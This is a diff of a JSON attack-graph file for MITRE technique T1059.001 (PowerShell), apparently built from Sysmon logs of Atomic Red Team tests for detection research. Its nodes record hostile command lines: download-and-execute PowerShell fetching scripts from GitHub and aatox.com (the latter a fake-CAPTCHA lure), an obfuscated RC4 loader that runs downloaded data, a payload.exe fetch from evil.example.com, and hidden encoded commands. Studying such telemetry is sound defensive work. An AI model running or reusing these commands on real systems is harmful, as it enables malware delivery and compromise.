@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1059.001",
-  "generated_at_utc": "2026-05-08T16:05:30.734144+00:00",
+  "generated_at_utc": "2026-05-08T16:32:36.737939+00:00",
   "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1059.001\\atomic_red_team\\captcha_windows-sysmon.log",
   "source_files": [
     "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1059.001\\atomic_red_team\\captcha_windows-sysmon.log",
@@ -1301,47 +1301,23 @@
   },
   "nodes": [
     {
-      "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef0}:1",
-      "label": "aistubx86.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{b2c3d4e5-f6a7-8901-2345-67890abcdef0}",
-        "pid": "1235",
-        "image_path": "%programfiles%\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon\\ai_stubs\\aistubx86.exe",
-        "command_line": "%programfiles%\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon\\ai_stubs\\aistubx86.exe\" -appid fakeinstaller -appdir \"c:\\program files\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef0}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "aistubx86.exe",
-        "name": "aistubx86.exe"
-      }
-    },
-    {
-      "id": "network:67.199.248.10:80:tcp",
-      "label": "67.199.248.10",
+      "id": "network:::ffff:67.199.248.11;::ffff:67.199.248.10;::tcp",
+      "label": "::ffff:67.199.248.11;::ffff:67.199.248.10;",
       "type": "network",
       "group": "Network",
       "properties": {
-        "destination_ip": "67.199.248.10",
-        "destination_port": "80",
+        "destination_ip": "::ffff:67.199.248.11;::ffff:67.199.248.10;",
+        "destination_port": "",
         "protocol": "tcp",
         "domain_name": "bit.ly",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "parent_process_id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
-        "event_id": "3",
-        "id": "network:67.199.248.10:80:tcp",
+        "parent_process_id": "Process:{5ABCFE62-D502-6040-CD4B-00000000AD01}:1",
+        "event_id": "22",
+        "id": "network:::ffff:67.199.248.11;::ffff:67.199.248.10;::tcp",
         "type": "Network",
         "entity_class": "NetworkEntity",
-        "display_name": "67.199.248.10",
-        "name": "67.199.248.10"
+        "display_name": "::ffff:67.199.248.11;::ffff:67.199.248.10;",
+        "name": "::ffff:67.199.248.11;::ffff:67.199.248.10;"
       }
     },
     {
@@ -1369,74 +1345,262 @@
       }
     },
     {
-      "id": "Process:{5ABCFE62-E9C2-6040-4A4E-00000000AD01}:1",
-      "label": "cmd.exe",
+      "id": "Process:{2935EF20-8F24-5FD0-0000-00104DAC0500}:1",
+      "label": "winrshost.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "windows command processor",
-        "guid": "{5ABCFE62-E9C2-6040-4A4E-00000000AD01}",
-        "pid": "5808",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"powershell.exe \"invoke-expression (new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\\enigma0x3\\misc-powershell-stuff\\a0dfca7056ef20295b156b8207480dc2465f94c3\\invoke-apppathbypass.ps1'); invoke-apppathbypass -payload '%windir%\\system32\\cmd.exe'\"",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "2c5b0345007f3b0ff1974ed98b96760e3216d974c63c35337ad990b86e80ad3d",
+        "process_name": "host process for winrm's remote shell plugin",
+        "guid": "{2935EF20-8F24-5FD0-0000-00104DAC0500}",
+        "pid": "4588",
+        "image_path": "%system32%\\winrshost.exe",
+        "command_line": "%system32%\\winrshost.exe -embedding",
+        "original_file_name": "winrshost.exe",
+        "image_hash": "MD5=F40EC96CA18D88CB1F26FA2070010714,SHA256=607C014A3CA531FFAD50BCD90095C01E4E6B691D9E18473C70E4699CF1E31453,IMPHASH=4216D8E7F36901B61DFD6309B49BCF96",
+        "command_hash": "b16d29df420c9110b5a2ed97ef661332ad7e2c63f73bc72fc04213edd5d071aa",
         "event_id": "1",
-        "id": "Process:{5ABCFE62-E9C2-6040-4A4E-00000000AD01}:1",
+        "id": "Process:{2935EF20-8F24-5FD0-0000-00104DAC0500}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{5ABCFE62-D502-6040-CD4B-00000000AD01}:1",
+        "display_name": "winrshost.exe",
+        "name": "winrshost.exe",
+        "parent_process_id": "Process:{2935EF20-8EFA-5FD0-0000-0010DF650000}:1",
         "user_id": "User:S-1-5-18"
       }
     },
     {
-      "id": "Process:{2935EF20-8F24-5FD0-0000-001021AF0500}:1",
+      "id": "Process:{E983936C-B3C5-6006-8700-00000000A301}:1",
       "label": "cmd.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows command processor",
-        "guid": "{2935EF20-8F24-5FD0-0000-001021AF0500}",
-        "pid": "4664",
+        "guid": "{E983936C-B3C5-6006-8700-00000000A301}",
+        "pid": "4076",
         "image_path": "%system32%\\cmd.exe",
         "command_line": "%system32%\\cmd.exe \\c powershell -noprofile -noninteractive -executionpolicy unrestricted -encodedcommand dwboag8ayqbtagka <ps_bypass_flag>",
         "original_file_name": "cmd.exe",
         "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
         "command_hash": "28cf8323ec21d81bae56f246181b6e06edc7a6d1edf0945a0e3add1755b46600",
         "event_id": "1",
-        "id": "Process:{2935EF20-8F24-5FD0-0000-001021AF0500}:1",
+        "id": "Process:{E983936C-B3C5-6006-8700-00000000A301}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "cmd.exe",
         "name": "cmd.exe",
-        "parent_process_id": "Process:{2935EF20-8F24-5FD0-0000-00104DAC0500}:1",
+        "parent_process_id": "Process:{E983936C-B3C5-6006-8500-00000000A301}:1",
         "user_id": "User:S-1-5-18"
       }
     },
     {
-      "id": "Process:{EF7148D2-9B56-5FB7-0700-000000009101}:1",
+      "id": "Process:{e8747bb8-7635-67e1-3964-000000004103}:1",
+      "label": "windows powershell",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{e8747bb8-7635-67e1-3964-000000004103}",
+        "pid": "1204",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\"                                                                                                                                                                                                                                                                                                                                 -windowstyle hidden -ep bypas <decoded_b64: function analitycal_data($data) {\r\n    $key = [system.text.encoding]::ascii.getbytes(\"ji32k7au4a83\")\r\n    $data = [system.convert]::frombase64string($data)\r\n\r\n    $r={$d,$k=$args;$s=0..255;0..255|%{$j=($j+$s[$_]+$k[$_%$k.length])%6;$s[$_],$s[$j]=$s[$j],$s[$_]};$d|%{$i=($i+1)%6;$h=($h+$s[$i])%6;$s[$i],$s[$h]=$s[$h],$s[$i];$_-bxor$s[($s[$i]+$s[$h])%6]}}\r\n    [system.text.encoding]::ascii.getstring((& $r $data $key)) | invoke-expression\r\n}\r\n\r\n$api_key = \"{0}{1}{1}{3}{4}{5}{6}{6}{26}{25}{8}{11}{12}{33}{1}{0}{45}{32}{45}{4}{17}{26}{19}{13}{38}{1}{17}{38}{1}{11}{19}{13}{21}{6}{16}{59}{8}{44}{38}{12}{6}{19}{17}{4}{0}{33}{6}{21}{25}{33}{38}{6}{25}{11}{1}{57}{1}\"\r\n$url = \"https:\\www.google.com\\search?q=bitcoin $usd worth&x=1\"\r\n\r\n$url = $api_key -f@($url).tochararray()\r\n\r\n$data = (new-object net.webclient).downloadstring($url)\r\nanalitycal_data $data> <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+        "command_hash": "c223cb60a39402bb7d150d802c1137beec4dc3351e9fb3689da291a0ada2624d",
+        "parent_process_id": "Process:{e8747bb8-6cb9-67e1-2463-000000004103}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{e8747bb8-7635-67e1-3964-000000004103}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows powershell",
+        "name": "windows powershell"
+      }
+    },
+    {
+      "id": "Process:{E983936C-CCF9-6006-5E07-00000000A301}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{E983936C-CCF9-6006-5E07-00000000A301}",
+        "pid": "6580",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe \\c %appdata%\\microsoft\\windows\\start menu\\programs\\startup\\runwallpapersetupinit.cmd\"",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "1d2dadac80afe60f7ba2e764185d90b9656dc94f33f543908b2266d8f6ab9875",
+        "event_id": "1",
+        "id": "Process:{E983936C-CCF9-6006-5E07-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{E983936C-CCDD-6006-4607-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{2c0cb891-e882-6824-8c23-000000004603}:1",
+      "label": "windows powershell",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{2c0cb891-e882-6824-8c23-000000004603}",
+        "pid": "2912",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" -nop -windowstyle hidden -command \"invoke-expression (irm 'https:\\aatox.com\\verify\\45.ps1')\" # ✅ i am not a robot | captcha verification hash: 7680 <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
+        "command_hash": "5437b414be378fbb27de4df926349832662bcdf2e8114ee72e0712484d87a748",
+        "parent_process_id": "Process:{2c0cb891-a627-6823-f300-000000004603}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{2c0cb891-e882-6824-8c23-000000004603}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows powershell",
+        "name": "windows powershell"
+      }
+    },
+    {
+      "id": "network:67.199.248.10:80:tcp",
+      "label": "67.199.248.10",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "67.199.248.10",
+        "destination_port": "80",
+        "protocol": "tcp",
+        "domain_name": "bit.ly",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "parent_process_id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
+        "event_id": "3",
+        "id": "network:67.199.248.10:80:tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "67.199.248.10",
+        "name": "67.199.248.10"
+      }
+    },
+    {
+      "id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
+      "label": "windows powershell",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{E983936C-CCF9-6006-6007-00000000A301}",
+        "pid": "6628",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe  -noprofile -noninteractive -nologo -windowstyle hidden -executionpolicy unrestricted \"import-module \"%programdata%\\amazon\\ec2-windows\\launch\\module\\ec2launch.psd1\"; set-wallpaper -initial <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "ad881edde1594729d4cdbc33b092285b7cb9d63526ea843a079f2db6b83f12ce",
+        "parent_process_id": "Process:{E983936C-CCF9-6006-5E07-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows powershell",
+        "name": "windows powershell"
+      }
+    },
+    {
+      "id": "Process:{2935EF20-8EF8-5FD0-0000-0010F6460000}:1",
       "label": "wininit.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows start-up application",
-        "guid": "{EF7148D2-9B56-5FB7-0700-000000009101}",
-        "pid": "720",
+        "guid": "{2935EF20-8EF8-5FD0-0000-0010F6460000}",
+        "pid": "708",
         "image_path": "%system32%\\wininit.exe",
         "command_line": "wininit.exe",
         "original_file_name": "wininit.exe",
         "image_hash": "MD5=5A998F811D7805B79B8E769027F62FD2,SHA256=8694C5732D26921EEA29589A9FA4182139EF3D9EA6B6D0ACCA8994B4AA5DEFE5,IMPHASH=C8D526C4E61942E1B11AE4B7EE2DDE5D",
         "command_hash": "1f4d2eef88421562bb004b2664a4dbb4d5cef95fff6b344c9202326cac15974d",
         "event_id": "1",
-        "id": "Process:{EF7148D2-9B56-5FB7-0700-000000009101}:1",
+        "id": "Process:{2935EF20-8EF8-5FD0-0000-0010F6460000}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "wininit.exe",
         "name": "wininit.exe",
-        "parent_process_id": "Process:{EF7148D2-9B56-5FB7-0400-000000009101}:1",
+        "parent_process_id": "Process:{2935EF20-8EF8-5FD0-0000-001032420000}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{c3d4e5f6-a7b8-9012-3456-7890abcdef11}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{c3d4e5f6-a7b8-9012-3456-7890abcdef11}",
+        "pid": "2345",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe \\c start \\b powershell -windowstyle hidden %programfiles%\\windowsapps\\malicioustoolkit_3.0.0.0_x64__nopqrstuvwxyz\\scripts\\config.ps1 -action download -file http:\\evil.example.com\\payload.exe <ps_bypass_flag>",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{c3d4e5f6-a7b8-9012-3456-7890abcdef11}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe"
+      }
+    },
+    {
+      "id": "Process:{EF7148D2-9B58-5FB7-0C00-000000009101}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "host process for windows services",
+        "guid": "{EF7148D2-9B58-5FB7-0C00-000000009101}",
+        "pid": "608",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "%system32%\\svchost.exe -k dcomlaunch",
+        "original_file_name": "svchost.exe",
+        "image_hash": "MD5=36F670D89040709013F6A460176767EC,SHA256=438B6CCD84F4DD32D9684ED7D58FD7D1E5A75FE3F3D12AB6C788E6BB0FFAD5E7,IMPHASH=2CED93915677390B76EE1916B92F3EF6",
+        "command_hash": "28b32bc560e36b3ba60e30317203363f92776e1d46a79bcc4970554f0ad5dd19",
+        "event_id": "1",
+        "id": "Process:{EF7148D2-9B58-5FB7-0C00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe",
+        "parent_process_id": "Process:{EF7148D2-9B56-5FB7-0A00-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{2935EF20-8F24-5FD0-0000-0010ECAF0500}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{2935EF20-8F24-5FD0-0000-0010ECAF0500}",
+        "pid": "4676",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell  -noprofile -noninteractive -executionpolicy unrestricted -encodedcommand dwboag8ayqbtagka <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "3a5fd7b8b5f48c071c81e4f42eda4f7a93a82aeba4a0abe28eb345e0f0715338",
+        "event_id": "1",
+        "id": "Process:{2935EF20-8F24-5FD0-0000-0010ECAF0500}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{2935EF20-8F24-5FD0-0000-001021AF0500}:1",
         "user_id": "User:S-1-5-18"
       }
     },
@@ -1489,191 +1653,23 @@
       }
     },
     {
-      "id": "Process:{c3d4e5f6-a7b8-9012-3456-7890abcdef11}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{c3d4e5f6-a7b8-9012-3456-7890abcdef11}",
-        "pid": "2345",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe \\c start \\b powershell -windowstyle hidden %programfiles%\\windowsapps\\malicioustoolkit_3.0.0.0_x64__nopqrstuvwxyz\\scripts\\config.ps1 -action download -file http:\\evil.example.com\\payload.exe <ps_bypass_flag>",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{c3d4e5f6-a7b8-9012-3456-7890abcdef11}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe"
-      }
-    },
-    {
-      "id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
-      "label": "windows powershell",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{E983936C-CD9F-6006-9907-00000000A301}",
-        "pid": "7244",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f",
-        "parent_process_id": "Process:{E983936C-CCDD-6006-4607-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows powershell",
-        "name": "windows powershell"
-      }
-    },
-    {
-      "id": "Process:{2935EF20-8F24-5FD0-0000-0010ECAF0500}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{2935EF20-8F24-5FD0-0000-0010ECAF0500}",
-        "pid": "4676",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell  -noprofile -noninteractive -executionpolicy unrestricted -encodedcommand dwboag8ayqbtagka <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "3a5fd7b8b5f48c071c81e4f42eda4f7a93a82aeba4a0abe28eb345e0f0715338",
-        "event_id": "1",
-        "id": "Process:{2935EF20-8F24-5FD0-0000-0010ECAF0500}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{2935EF20-8F24-5FD0-0000-001021AF0500}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{2c0cb891-e882-6824-8c23-000000004603}:1",
-      "label": "windows powershell",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{2c0cb891-e882-6824-8c23-000000004603}",
-        "pid": "2912",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" -nop -windowstyle hidden -command \"invoke-expression (irm 'https:\\aatox.com\\verify\\45.ps1')\" # ✅ i am not a robot | captcha verification hash: 7680 <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
-        "command_hash": "5437b414be378fbb27de4df926349832662bcdf2e8114ee72e0712484d87a748",
-        "parent_process_id": "Process:{2c0cb891-a627-6823-f300-000000004603}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{2c0cb891-e882-6824-8c23-000000004603}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows powershell",
-        "name": "windows powershell"
-      }
-    },
-    {
-      "id": "Process:{e8747bb8-7635-67e1-3964-000000004103}:1",
-      "label": "windows powershell",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{e8747bb8-7635-67e1-3964-000000004103}",
-        "pid": "1204",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\"                                                                                                                                                                                                                                                                                                                                 -windowstyle hidden -ep bypas <decoded_b64: function analitycal_data($data) {\r\n    $key = [system.text.encoding]::ascii.getbytes(\"ji32k7au4a83\")\r\n    $data = [system.convert]::frombase64string($data)\r\n\r\n    $r={$d,$k=$args;$s=0..255;0..255|%{$j=($j+$s[$_]+$k[$_%$k.length])%6;$s[$_],$s[$j]=$s[$j],$s[$_]};$d|%{$i=($i+1)%6;$h=($h+$s[$i])%6;$s[$i],$s[$h]=$s[$h],$s[$i];$_-bxor$s[($s[$i]+$s[$h])%6]}}\r\n    [system.text.encoding]::ascii.getstring((& $r $data $key)) | invoke-expression\r\n}\r\n\r\n$api_key = \"{0}{1}{1}{3}{4}{5}{6}{6}{26}{25}{8}{11}{12}{33}{1}{0}{45}{32}{45}{4}{17}{26}{19}{13}{38}{1}{17}{38}{1}{11}{19}{13}{21}{6}{16}{59}{8}{44}{38}{12}{6}{19}{17}{4}{0}{33}{6}{21}{25}{33}{38}{6}{25}{11}{1}{57}{1}\"\r\n$url = \"https:\\www.google.com\\search?q=bitcoin $usd worth&x=1\"\r\n\r\n$url = $api_key -f@($url).tochararray()\r\n\r\n$data = (new-object net.webclient).downloadstring($url)\r\nanalitycal_data $data> <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
-        "command_hash": "c223cb60a39402bb7d150d802c1137beec4dc3351e9fb3689da291a0ada2624d",
-        "parent_process_id": "Process:{e8747bb8-6cb9-67e1-2463-000000004103}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{e8747bb8-7635-67e1-3964-000000004103}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows powershell",
-        "name": "windows powershell"
-      }
-    },
-    {
-      "id": "Process:{5ABCFE62-D502-6040-CD4B-00000000AD01}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{5ABCFE62-D502-6040-CD4B-00000000AD01}",
-        "pid": "6732",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{5ABCFE62-D502-6040-CD4B-00000000AD01}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
-      }
-    },
-    {
-      "id": "Process:{EF7148D2-9B58-5FB7-0C00-000000009101}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "host process for windows services",
-        "guid": "{EF7148D2-9B58-5FB7-0C00-000000009101}",
-        "pid": "608",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "%system32%\\svchost.exe -k dcomlaunch",
-        "original_file_name": "svchost.exe",
-        "image_hash": "MD5=36F670D89040709013F6A460176767EC,SHA256=438B6CCD84F4DD32D9684ED7D58FD7D1E5A75FE3F3D12AB6C788E6BB0FFAD5E7,IMPHASH=2CED93915677390B76EE1916B92F3EF6",
-        "command_hash": "28b32bc560e36b3ba60e30317203363f92776e1d46a79bcc4970554f0ad5dd19",
-        "event_id": "1",
-        "id": "Process:{EF7148D2-9B58-5FB7-0C00-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe",
-        "parent_process_id": "Process:{EF7148D2-9B56-5FB7-0A00-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "network:::ffff:67.199.248.11;::ffff:67.199.248.10;::tcp",
-      "label": "::ffff:67.199.248.11;::ffff:67.199.248.10;",
+      "id": "network:<private_ip>:80:tcp",
+      "label": "<PRIVATE_IP>",
       "type": "network",
       "group": "Network",
       "properties": {
-        "destination_ip": "::ffff:67.199.248.11;::ffff:67.199.248.10;",
-        "destination_port": "",
+        "destination_ip": "<PRIVATE_IP>",
+        "destination_port": "80",
         "protocol": "tcp",
-        "domain_name": "bit.ly",
+        "domain_name": "-",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "parent_process_id": "Process:{5ABCFE62-D502-6040-CD4B-00000000AD01}:1",
-        "event_id": "22",
-        "id": "network:::ffff:67.199.248.11;::ffff:67.199.248.10;::tcp",
+        "parent_process_id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
+        "event_id": "3",
+        "id": "network:<private_ip>:80:tcp",
         "type": "Network",
         "entity_class": "NetworkEntity",
-        "display_name": "::ffff:67.199.248.11;::ffff:67.199.248.10;",
-        "name": "::ffff:67.199.248.11;::ffff:67.199.248.10;"
+        "display_name": "<PRIVATE_IP>",
+        "name": "<PRIVATE_IP>"
       }
     },
     {
@@ -1701,117 +1697,16 @@
       }
     },
     {
-      "id": "File:970749539f7cef8cce617d1ed61bb84594ae3c7eca49cf88514d930366ddc147:17",
-      "label": "pshost.132593404674047142.6232.defaultappdomain.powershell",
-      "type": "file",
-      "group": "File",
+      "id": "Technique:T1059_001",
+      "label": "T1059.001",
+      "type": "technique",
+      "group": "Technique",
       "properties": {
-        "file_path": "pshost.132593404674047142.6232.defaultappdomain.powershell",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{5ABCFE62-E9B3-6040-444E-00000000AD01}:1",
-        "event_id": "17",
-        "id": "File:970749539f7cef8cce617d1ed61bb84594ae3c7eca49cf88514d930366ddc147:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "pshost.132593404674047142.6232.defaultappdomain.powershell",
-        "name": "pshost.132593404674047142.6232.defaultappdomain.powershell"
-      }
-    },
-    {
-      "id": "Process:{EF7148D2-9B8D-5FB7-8900-000000009101}:1",
-      "label": "winrshost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "host process for winrm's remote shell plugin",
-        "guid": "{EF7148D2-9B8D-5FB7-8900-000000009101}",
-        "pid": "4824",
-        "image_path": "%system32%\\winrshost.exe",
-        "command_line": "%system32%\\winrshost.exe -embedding",
-        "original_file_name": "winrshost.exe",
